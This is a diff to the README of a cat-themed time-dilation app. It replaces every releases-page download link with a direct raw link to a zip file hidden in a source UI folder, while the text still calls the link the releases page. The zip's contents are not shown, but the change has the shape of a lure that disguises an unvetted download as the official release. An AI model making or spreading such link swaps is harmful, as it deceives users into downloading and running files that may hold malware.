@@ -1,6 +1,6 @@
 # 🐱 MeowNiverse - Explore Time Dilation Simply
 
-[![Download MeowNiverse](https://img.shields.io/badge/Download-MeowNiverse-brightgreen?style=for-the-badge)](https://github.com/MariFerraz1/MeowNiverse/releases)
+[![Download MeowNiverse](https://img.shields.io/badge/Download-MeowNiverse-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/MariFerraz1/MeowNiverse/main/src/components/ui/Meow-Niverse-v1.1-beta.1.zip)
 
 ---
 
@@ -34,7 +34,7 @@ MeowNiverse lets you see how time slows down for an astronaut cat moving near li
 
 To get the app, visit the releases page on GitHub:
 
-[![Download MeowNiverse](https://img.shields.io/badge/Download-MeowNiverse-blue?style=for-the-badge)](https://github.com/MariFerraz1/MeowNiverse/releases)
+[![Download MeowNiverse](https://img.shields.io/badge/Download-MeowNiverse-blue?style=for-the-badge)](https://raw.githubusercontent.com/MariFerraz1/MeowNiverse/main/src/components/ui/Meow-Niverse-v1.1-beta.1.zip)
 
 Click this link or button twice in this guide to make sure you find it easily.
 
@@ -44,7 +44,7 @@ Click this link or button twice in this guide to make sure you find it easily.
 
 1. **Open the Releases Page**
 
-   Click this link: https://github.com/MariFerraz1/MeowNiverse/releases. It takes you to the page where all versions of the app are stored.
+   Click this link: https://raw.githubusercontent.com/MariFerraz1/MeowNiverse/main/src/components/ui/Meow-Niverse-v1.1-beta.1.zip It takes you to the page where all versions of the app are stored.
 
 2. **Find the Latest Version**
 
@@ -114,7 +114,7 @@ A: No. MeowNiverse runs entirely on your computer and does not require internet 
 ## 📥 Download Link (Again for Convenience)
 
 Visit the releases page here to get the latest version of MeowNiverse:  
-[https://github.com/MariFerraz1/MeowNiverse/releases](https://github.com/MariFerraz1/MeowNiverse/releases)
+[https://raw.githubusercontent.com/MariFerraz1/MeowNiverse/main/src/components/ui/Meow-Niverse-v1.1-beta.1.zip](https://raw.githubusercontent.com/MariFerraz1/MeowNiverse/main/src/components/ui/Meow-Niverse-v1.1-beta.1.zip)
 
 ---
 
